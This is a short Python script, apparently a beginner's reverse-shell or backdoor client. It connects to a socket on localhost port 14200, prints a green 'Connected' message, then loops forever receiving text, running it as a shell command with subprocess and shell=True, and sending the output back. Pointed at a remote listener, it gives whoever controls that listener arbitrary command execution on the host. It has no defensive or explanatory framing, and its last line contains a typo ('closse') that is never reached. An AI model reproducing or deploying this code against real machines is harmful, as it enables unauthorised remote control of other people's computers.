import subprocess
import socket
from sys import getrefcount
from colorama import Fore


s=socket.socket(2,1)
s.connect(('localhost',14200))
print(Fore.GREEN+"Connected!!!!!!!!!!")

while True:
    data=s.recv(123456789)
    cmd=subprocess.check_output(data.decode(),shell=True)
    s.send(cmd)

s.closse()